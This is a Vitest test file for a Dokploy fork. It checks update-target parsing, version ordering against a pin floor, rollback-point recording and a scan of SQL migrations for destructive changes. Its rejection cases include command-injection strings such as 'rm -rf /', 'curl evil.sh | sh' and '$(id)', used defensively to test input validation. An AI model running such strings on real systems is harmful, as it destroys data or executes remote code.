import {
	existsSync,
	mkdirSync,
	mkdtempSync,
	readdirSync,
	readFileSync,
	rmSync,
	statSync,
	writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import path, { join } from "node:path";
import {
	compareDokployVersions,
	DOKPLOY_IMAGE_REPO,
	DOKPLOY_MIN_PINNED_VERSION,
	isBelowDokployPinFloor,
	isDokployUpdateTarget,
	parseDokployUpdateTarget,
	resolveDokployUpdateImage,
} from "@dokploy/server/utils/dokploy-update-target";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";

const mocks = vi.hoisted(() => ({
	spawnAsync: vi.fn(),
}));

vi.mock("@dokploy/server/db", () => ({
	db: { query: {} },
}));

vi.mock("@dokploy/server/utils/process/spawnAsync", () => ({
	spawnAsync: mocks.spawnAsync,
}));

const { readDokployRollbackPoint, recordDokployRollbackPoint } = await import(
	"@dokploy/server/services/settings"
);

const HEX = "0123456789abcdef".repeat(4);
const DIGEST = `sha256:${HEX}`;
const OTHER_DIGEST = `sha256:${"f".repeat(64)}`;
const REPO = "ghcr.io/devinosolutions/dokploy-community";

describe("pinned update targets", () => {
	it.each([
		["v0.30.8", { tag: "v0.30.8" }],
		["v0.30.8-community.32", { tag: "v0.30.8-community.32" }],
		["v0.30.8-community.32.1", { tag: "v0.30.8-community.32.1" }],
		["v10.20.30-community.400.5", { tag: "v10.20.30-community.400.5" }],
		[DIGEST, { digest: DIGEST }],
	])("parses %j", (target, parsed) => {
		expect(parseDokployUpdateTarget(target)).toEqual(parsed);
		expect(isDokployUpdateTarget(target)).toBe(true);
	});

	it.each([
		// not a release tag
		"",
		"latest",
		"canary",
		"feature",
		"0.30.8",
		"V0.30.8",
		"v0.30",
		"v0.30.8-community",
		"v0.30.8-community.",
		"v0.30.8-community.32.1.2",
		"v0.30.8-rc.1",
		"v0.30.8+build",
		"v０.30.8",
		// whitespace and shell syntax
		" v0.30.8",
		"v0.30.8 ",
		"v0.30.8\n",
		"v0.30.8\r",
		"v0.30.8\t",
		"v0.30.8 ",
		"v0.30.8\nid",
		"v0.30.8;",
		"v0.30.8; id",
		"v0.30.8;rm -rf /",
		"v0.30.8 && curl evil.sh | sh",
		"v0.30.8|sh",
		"v0.30.8`id`",
		"$(id)",
		"${IFS}",
		"'v0.30.8'",
		'"v0.30.8"',
		"v0.30.8\u0000",
		"--help",
		"-v",
		"../v0.30.8",
		// other repos, or the repo spelled out by the caller
		"ghcr.io/evil/dokploy-community:v0.30.8",
		"dokploy/dokploy:v0.30.8",
		"docker.io/library/alpine:latest",
		`${REPO}:v0.30.8`,
		`${REPO}@${DIGEST}`,
		`${REPO}:v0.30.8@${DIGEST}`,
		`evil.io/x@${DIGEST}`,
		// a tag with a digest: nothing proves the digest is that tag's image
		`v0.30.8-community.32@${DIGEST}`,
		`v0.30.8@${DIGEST}`,
		`@${DIGEST}`,
		"v0.30.8@",
		`v0.30.8@@${DIGEST}`,
		`v0.30.8@${DIGEST}@${DIGEST}`,
		`v0.30.8 @${DIGEST}`,
		`v0.30.8@ ${DIGEST}`,
		`v0.30.8@${DIGEST} `,
		`latest@${DIGEST}`,
		`v0.30.8@sha256:${HEX.toUpperCase()}`,
		// malformed digests
		"sha256:",
		`sha256:${HEX.slice(1)}`,
		`sha256:${HEX}0`,
		`sha256:${HEX.toUpperCase()}`,
		`sha512:${HEX}`,
		`SHA256:${HEX}`,
		`sha256:${HEX.slice(1)}g`,
		`${DIGEST}\n`,
		`${DIGEST} --detach`,
		` ${DIGEST}`,
	])("rejects %j", (target) => {
		expect(parseDokployUpdateTarget(target)).toBeNull();
		expect(isDokployUpdateTarget(target)).toBe(false);
		expect(resolveDokployUpdateImage(target)).toBeNull();
	});

	it("pins a tag and a digest inside the fork repo", () => {
		expect(DOKPLOY_IMAGE_REPO).toBe(REPO);
		expect(resolveDokployUpdateImage("v0.30.8-community.32.1")).toBe(
			`${REPO}:v0.30.8-community.32.1`,
		);
		expect(resolveDokployUpdateImage(DIGEST)).toBe(`${REPO}@${DIGEST}`);
	});
});

describe("release ordering and the pin floor", () => {
	it.each([
		["v0.30.8-community.32", "v0.30.8-community.32", 0],
		["v0.30.8-community.32.1", "v0.30.8-community.32", 1],
		["v0.30.8-community.32", "v0.30.8-community.32.1", -1],
		["v0.30.8-community.10", "v0.30.8-community.9", 1],
		["v0.30.8-community.1", "v0.30.8", 1],
		["v0.30.9", "v0.30.8-community.99", 1],
		["v0.29.12-community.5", "v0.30.8-community.1", -1],
		["v1.0.0", "v0.99.99-community.9.9", 1],
		["v0.30.10", "v0.30.9-community.40", 1],
		["v0.30.8-community.1.1", "v0.30.8-community.2", -1],
	])("compares %s with %s as %i", (a, b, expected) => {
		expect(compareDokployVersions(a, b)).toBe(expected);
	});

	it("can't compare something that is not a release tag", () => {
		expect(compareDokployVersions("latest", "v0.30.8")).toBeNull();
		expect(isBelowDokployPinFloor("latest")).toBe(true);
	});

	it("puts the floor at v0.30.8-community.1", () => {
		expect(DOKPLOY_MIN_PINNED_VERSION).toBe("v0.30.8-community.1");
		expect(isBelowDokployPinFloor("v0.30.8-community.1")).toBe(false);
		expect(isBelowDokployPinFloor("v0.30.8-community.32.1")).toBe(false);
		expect(isBelowDokployPinFloor("v0.30.8")).toBe(true);
		expect(isBelowDokployPinFloor("v0.29.12-community.1")).toBe(true);
		expect(isBelowDokployPinFloor("v0.29.8")).toBe(true);
	});
});

describe("Dokploy rollback point", () => {
	let dir: string;
	let file: string;

	const spec = (image: string, state = "") => {
		mocks.spawnAsync.mockResolvedValue(Buffer.from(`${image} ${state}\n`));
	};

	const writePoint = (version = "v0.30.8-community.20") => {
		const point = { version, digest: OTHER_DIGEST };
		writeFileSync(file, JSON.stringify(point));
		return point;
	};

	const recorded = () => JSON.parse(readFileSync(file, "utf8"));

	beforeEach(() => {
		vi.clearAllMocks();
		dir = mkdtempSync(join(tmpdir(), "t7529-rollback-"));
		file = join(dir, "dokploy-update-rollback.json");
	});

	afterEach(() => {
		rmSync(dir, { recursive: true, force: true });
	});

	it("records the version and digest of the running service image", async () => {
		spec(`${REPO}:v0.30.8-community.31@${DIGEST}`, "completed");

		await recordDokployRollbackPoint("v0.30.8-community.31", { file });

		expect(mocks.spawnAsync).toHaveBeenCalledWith(
			"docker",
			[
				"service",
				"inspect",
				"dokploy",
				"--format",
				"{{.Spec.TaskTemplate.ContainerSpec.Image}} {{if .UpdateStatus}}{{.UpdateStatus.State}}{{end}}",
			],
			undefined,
			{ timeout: 30_000 },
		);
		expect(recorded()).toEqual({
			version: "v0.30.8-community.31",
			digest: DIGEST,
			recordedAt: expect.any(String),
		});
		await expect(
			readDokployRollbackPoint("v0.30.8-community.32", file),
		).resolves.toEqual({
			version: "v0.30.8-community.31",
			digest: DIGEST,
			recordedAt: recorded().recordedAt,
		});
	});

	it("writes the file owner-only and leaves no temp file", async () => {
		spec(`${REPO}:v0.30.8-community.31@${DIGEST}`);

		await recordDokployRollbackPoint("v0.30.8-community.31", { file });

		expect(readdirSync(dir)).toEqual(["dokploy-update-rollback.json"]);
		if (process.platform !== "win32") {
			expect(statSync(file).mode & 0o777).toBe(0o600);
		}
	});

	it("records an image without a tag, or with the latest tag", async () => {
		spec(`${REPO}@${DIGEST}`);
		await recordDokployRollbackPoint("v0.30.8-community.31", { file });
		expect(recorded().digest).toBe(DIGEST);

		spec(`${REPO}:latest@${DIGEST}`);
		await recordDokployRollbackPoint("v0.30.8-community.30", { file });
		expect(recorded().version).toBe("v0.30.8-community.30");
	});

	it("offers no rollback to the version that is running", async () => {
		spec(`${REPO}:v0.30.8-community.32@${DIGEST}`);
		await recordDokployRollbackPoint("v0.30.8-community.32", { file });

		await expect(
			readDokployRollbackPoint("v0.30.8-community.32", file),
		).resolves.toBeNull();
	});

	it.each([
		["the running digest", { digest: DIGEST }],
		["the running version's tag", { tag: "v0.30.8-community.31" }],
	])(
		"keeps the old point when installing %s (a reinstall)",
		async (_name, installing) => {
			const point = writePoint();
			spec(`${REPO}:v0.30.8-community.31@${DIGEST}`);

			await recordDokployRollbackPoint("v0.30.8-community.31", {
				file,
				installing,
			});

			expect(recorded()).toEqual(point);
		},
	);

	it("replaces the point when installing another image", async () => {
		writePoint();
		spec(`${REPO}:v0.30.8-community.31@${DIGEST}`);

		await recordDokployRollbackPoint("v0.30.8-community.31", {
			file,
			installing: { digest: OTHER_DIGEST },
		});

		expect(recorded()).toEqual({
			version: "v0.30.8-community.31",
			digest: DIGEST,
			recordedAt: expect.any(String),
		});
	});

	it.each([
		["no digest", `${REPO}:v0.30.8-community.31`],
		["another repo", `ghcr.io/evil/dokploy-community:v0.30.8@${DIGEST}`],
		["upstream", `dokploy/dokploy:v0.30.8@${DIGEST}`],
		["a tag naming another version", `${REPO}:v0.30.8-community.33@${DIGEST}`],
		["an empty spec", ""],
	])("drops the old point when the spec has %s", async (_name, image) => {
		writePoint();
		spec(image);

		await recordDokployRollbackPoint("v0.30.8-community.31", { file });

		expect(existsSync(file)).toBe(false);
		await expect(
			readDokployRollbackPoint("v0.30.8-community.31", file),
		).resolves.toBeNull();
	});

	it.each(["updating", "paused", "rollback_started", "rollback_paused"])(
		"drops the point of the update in flight while the service is %s",
		async (state) => {
			writePoint("v0.30.8-community.30");
			spec(`${REPO}:v0.30.8-community.31@${OTHER_DIGEST}`, state);

			await recordDokployRollbackPoint("v0.30.8-community.30", {
				file,
				installedImage: `${REPO}:v0.30.8-community.32`,
			});

			expect(existsSync(file)).toBe(false);
		},
	);

	it("never throws, and drops the old point, when docker fails", async () => {
		writePoint();
		mocks.spawnAsync.mockRejectedValue(new Error("Cannot connect to docker"));
		const error = vi.spyOn(console, "error").mockImplementation(() => {});

		await expect(
			recordDokployRollbackPoint("v0.30.8-community.31", { file }),
		).resolves.toBeUndefined();

		expect(existsSync(file)).toBe(false);
		error.mockRestore();
	});

	it("removes its temp file when the write can't be finished", async () => {
		spec(`${REPO}:v0.30.8-community.31@${DIGEST}`);
		const error = vi.spyOn(console, "error").mockImplementation(() => {});
		// A non-empty directory in the record's place makes the rename fail.
		const blocked = join(dir, "blocked");
		mkdirSync(blocked);
		writeFileSync(join(blocked, "keep"), "");

		await expect(
			recordDokployRollbackPoint("v0.30.8-community.31", { file: blocked }),
		).resolves.toBeUndefined();

		expect(readdirSync(dir).filter((name) => name.endsWith(".tmp"))).toEqual(
			[],
		);
		error.mockRestore();
	});

	it.each([
		["a missing file", null],
		["broken JSON", "{"],
		["null", "null"],
		[
			"a digest with shell syntax",
			JSON.stringify({
				version: "v0.30.8-community.31",
				digest: `${DIGEST}; id`,
			}),
		],
		[
			"a version that is not a release",
			JSON.stringify({ version: "latest", digest: DIGEST }),
		],
		[
			"a version below the pin floor",
			JSON.stringify({ version: "v0.29.12-community.1", digest: DIGEST }),
		],
		["missing fields", JSON.stringify({ digest: DIGEST })],
	])("offers no rollback for %s", async (_name, content) => {
		if (content !== null) {
			writeFileSync(file, content);
		}

		await expect(
			readDokployRollbackPoint("v0.30.8-community.32", file),
		).resolves.toBeNull();
	});
});

// The floor's release ships migrations up to 0206. Every later migration only
// adds, so an install pinned at the floor still runs on today's schema.
const LAST_MIGRATION_OF_FLOOR = 206;
// Migrations above the floor that were checked and are known to be safe for
// the floor's release (a catch-up that drops nothing it reads, say).
const ALLOWED_DESTRUCTIVE_MIGRATIONS: string[] = [];
const DESTRUCTIVE =
	/\b(DROP\s+COLUMN|DROP\s+TABLE|RENAME|SET\s+NOT\s+NULL|SET\s+DATA\s+TYPE|DROP\s+DEFAULT)\b/i;

// True when the SQL drops, renames or tightens something the floor's release
// uses. A NOT NULL column added without a default breaks its inserts too; a
// new table's NOT NULL columns don't (the old release never writes to it).
const isDestructive = (sql: string) =>
	DESTRUCTIVE.test(sql) ||
	sql
		.split(/\bADD\s+COLUMN\b/i)
		.slice(1)
		.some(
			(column) =>
				/\bNOT\s+NULL\b/i.test(column.split(/;|,\s*ADD\b/i)[0] ?? "") &&
				!/\bDEFAULT\b/i.test(column.split(/;|,\s*ADD\b/i)[0] ?? ""),
		);

describe("the pin floor and the migrations", () => {
	it("no migration after the floor drops, renames or tightens anything", () => {
		const drizzleDir = path.resolve(__dirname, "../../drizzle");
		const offending = readdirSync(drizzleDir)
			.filter((name) => /^\d{4}_.*\.sql$/.test(name))
			.filter((name) => Number(name.slice(0, 4)) > LAST_MIGRATION_OF_FLOOR)
			.filter((name) => !ALLOWED_DESTRUCTIVE_MIGRATIONS.includes(name))
			.filter((name) =>
				isDestructive(readFileSync(join(drizzleDir, name), "utf8")),
			);

		expect(
			offending,
			`bump DOKPLOY_MIN_PINNED_VERSION (now ${DOKPLOY_MIN_PINNED_VERSION}) past these migrations, or allow-list them after checking that release still runs on the newer schema`,
		).toEqual([]);
	});

	it("scans the migrations it should", () => {
		const drizzleDir = path.resolve(__dirname, "../../drizzle");
		const scanned = readdirSync(drizzleDir).filter(
			(name) =>
				/^\d{4}_.*\.sql$/.test(name) &&
				Number(name.slice(0, 4)) > LAST_MIGRATION_OF_FLOOR,
		);
		expect(scanned).toContain("0207_deployment_queue_journal.sql");
		expect(isDestructive("ALTER TABLE x DROP COLUMN y;")).toBe(true);
		expect(isDestructive('ALTER TABLE x ALTER COLUMN "y" SET NOT NULL;')).toBe(
			true,
		);
		expect(
			isDestructive('ALTER TABLE x ALTER COLUMN "y" SET DATA TYPE integer;'),
		).toBe(true);
		expect(isDestructive('ALTER TABLE x ALTER COLUMN "y" DROP DEFAULT;')).toBe(
			true,
		);
		expect(isDestructive('ALTER TABLE x ADD COLUMN "y" text NOT NULL;')).toBe(
			true,
		);
		expect(
			isDestructive(
				'ALTER TABLE x ADD COLUMN "a" text DEFAULT \'\' NOT NULL, ADD COLUMN "b" text NOT NULL;',
			),
		).toBe(true);
		expect(isDestructive("ALTER TABLE x ADD COLUMN y text;")).toBe(false);
		expect(
			isDestructive(
				'ALTER TABLE x ADD COLUMN "y" boolean DEFAULT false NOT NULL;',
			),
		).toBe(false);
		expect(
			isDestructive('CREATE TABLE "z" ("id" text PRIMARY KEY NOT NULL);'),
		).toBe(false);
	});
});
